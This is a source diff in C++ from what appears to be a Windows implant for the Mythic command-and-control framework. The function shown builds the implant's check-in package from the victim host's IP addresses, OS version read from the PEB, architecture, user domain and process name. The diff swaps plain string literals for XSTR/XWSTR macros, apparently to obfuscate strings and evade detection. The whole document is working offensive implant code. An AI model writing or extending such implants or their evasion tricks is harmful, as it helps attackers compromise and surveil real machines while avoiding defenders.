@@ -88,7 +88,7 @@ auto declfn starburst::build_checkin_package(
 
         if ( ip_count == 0 ) {
             package_add_int32( inst, pkg, 1 );
-            package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "0.0.0.0" ) ) );
+            package_add_string( inst, pkg, XSTR( "0.0.0.0" ) );
         } else {
             package_add_int32( inst, pkg, ip_count );
             for ( uint32_t i = 0; i < ip_count; i++ ) {
@@ -102,11 +102,11 @@ auto declfn starburst::build_checkin_package(
         char os_str[64] = { 0 };
         PPEB peb = NtCurrentPeb();
         int_to_str( os_str, peb->OSMajorVersion, 10 );
-        str_concat( os_str, symbol<char*>( const_cast<char*>( "." ) ) );
+        str_concat( os_str, XSTR( "." ) );
         char minor[12];
         int_to_str( minor, peb->OSMinorVersion, 10 );
         str_concat( os_str, minor );
-        str_concat( os_str, symbol<char*>( const_cast<char*>( "." ) ) );
+        str_concat( os_str, XSTR( "." ) );
         char build[12];
         int_to_str( build, peb->OSBuildNumber, 10 );
         str_concat( os_str, build );
@@ -142,16 +142,16 @@ auto declfn starburst::build_checkin_package(
 
     // architecture
 #ifdef _M_X64
-    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "x64" ) ) );
+    package_add_string( inst, pkg, XSTR( "x64" ) );
 #else
-    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "x86" ) ) );
+    package_add_string( inst, pkg, XSTR( "x86" ) );
 #endif
 
     // domain - try environment variable
     {
         wchar_t domain_w[128] = { 0 };
         inst.kernel32.GetEnvironmentVariableW(
-            symbol<LPCWSTR>( L"USERDOMAIN" ),
+            XWSTR( L"USERDOMAIN" ),
             domain_w, 128
         );
 
@@ -164,7 +164,7 @@ auto declfn starburst::build_checkin_package(
     package_add_int32( inst, pkg, 2 );
 
     // external IP (empty - Mythic fills this)
-    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "" ) ) );
+    package_add_string( inst, pkg, XSTR( "" ) );
 
     // process name
     {
